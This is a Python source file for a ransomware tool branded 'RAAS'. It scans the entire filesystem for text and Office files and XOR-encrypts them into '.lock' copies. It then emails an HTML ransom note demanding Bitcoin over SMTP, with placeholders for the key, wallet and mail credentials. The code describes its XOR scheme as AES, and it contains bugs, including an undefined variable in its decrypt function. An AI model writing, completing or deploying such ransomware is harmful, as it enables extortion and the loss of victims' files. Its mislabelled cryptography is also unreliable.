import os
import sys
import random
import hashlib
import shutil
import time
import socket 
from datetime import datetime


# --- Configuration ---
ENCRYPTION_KEY = b'YOUR_ENCRYPTION_KEY'  # Replace with a strong, unique key. Generate one using OpenSSL: openssl rand -hex 16
FILE_EXTENSION_MAP = {".txt": "encrypted.txt", ".docx": "encrypted.docx", ".xlsx": "encrypted.xlsx"} # Customize for your target file types
BITCOIN_ADDRESS = 'YOUR_BITCOIN_ADDRESS'  # Replace with your Bitcoin address
USERAGENT = "RAAS/1.0"

# --- Functions ---


def calculate_sha256(filepath):
    """Calculates the SHA256 hash of a file."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
            return hashlib.sha256(data).hexdigest()
    except Exception as e:
        print(f"Error calculating SHA256 for {filepath}: {e}")
        return None

def encrypt_file(filepath):
    """Encrypts a file using AES."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encryptedData = bytearray()
        for i in range(len(data)):
            byte = data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
            encryptedData.append(byte)
        return encryptedData
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")
        return None

def decrypt_file(data, key):
     """Decrypts a file using AES."""
     try:
         decryptedData = bytearray()
         i = 0
         while i < len(data):
             byte = data[i] ^ key[i % len(key)]
             decryptedData.append(byte)
             i += 1
         return decryptedData
     except Exception as e:
          print(f"Error decrypting {filepath}: {e}")
          return None


def send_invoice():
    """Sends the ransom note and invoice to the victim."""
    try:
        # --- Build Invoice HTML ---
        html = f"""<!DOCTYPE html><html><head><title>Ransom! Your Files</title></head><body><h1>Your Files Have Been Encrypted</h1>\n
                    <p>A robust, high-speed ransomware attack has been launched against your system.  We've taken the files and applied an AES encryption method.</p>\n
                    <p>To regain access, you must transfer 0.5 Bitcoin (approx. \$80) to the following address:</p><br>
                    <p style="text-align: center;"><img src="https://blockchain.info/wp-content/uploads/2023/12/Bitcoin_Fee_Structure.png" alt="Bitcoin Fee Structure" style="width: 400px;"></p>\n
                    <p>The invoice will remain valid for 72 hours.</p><br>\n
                    <p>When you transfer the funds, reply to this email with a copy of your transaction. We'll decrypt your files within minutes. </p>\n
                    <p style="text-align: center;">**RAAS Team**</p>\n
                </body></html>"""

        # --- Send Invoice via SMTP ---
        smtp_server = "smtp.gmail.com"  # Replace with your SMTP Server
        from_address = "ransomware@example.com" #Replace with your email address
        to_address = "victim@example.com" # Replace with the victim's email address
        password = "your_gmail_password" # Replace with your gmail password or App Password

        import smtplib
        msg = f"Subject: Your Files Have Been Encrypted\n From: RAAS Team <ransomware@example.com>\n To: victim@example.com\n\n{html}"
        with smtplib.SMTP(smtp_server, 587) as smtp: # Adjust port if necessary
            smtp.starttls()
            smtp.login(from_address, password)
            text = msg.splitlines()
            try:
                smtp.sendmail(from_address, to_address, text[-1])  # Send the last line as the body
            except Exception as e:
                 print(f"Error sending invoice via SMTP: {e}")


        print("Invoice sent successfully.")

    except Exception as e:
        print(f"Error sending invoice: {e}")


def main():
    """Main function to run the ransom.  Handles file encryption and invoice generation."""

    # --- Check for Encryption Key ---
    if not ENCRYPTION_KEY:
        print("Encryption key is not set! Please replace 'YOUR_ENCRYPTION_KEY'.")
        sys.exit(1)

    # --- Get List of Files ---
    files = []
    for root, _, filenames in os.walk("/", topdown=False):  # Scans the entire file system
        for filename in filenames:
            filepath = os.path.join(root, filename)
            if filepath.lower().endswith(".txt") or filepath.lower().endswith(".docx") or filepath.lower().endswith(".xlsx"): # Customize extensions
                files.append(filepath)

    # --- Encrypt Files ---
    encryptedFiles = []
    for filename in files:
        try:
            data = encrypt_file(filename)
            if data is not None:
                with open(filename + ".lock", "wb") as f:
                    f.write(data)
                print(f"Encrypted: {filename}")
                encryptedFiles.append(filename + ".lock")  # Store the lock file name
        except Exception as e:
            print(f"Error encrypting {filename}: {e}")

    # --- Send Invoice ---
    send_invoice()


# --- Run Ransom ---
if __name__ == "__main__":
    start_time = time.time()
    try:
        main()
    except Exception as e:
        print(f"An error occurred during encryption: {e}")

    end_time = time.time()
    duration = end_time - start_time
    print("\n--- Ransom Completed in {} seconds ---".format(int(duration)))  # Print duration for debugging
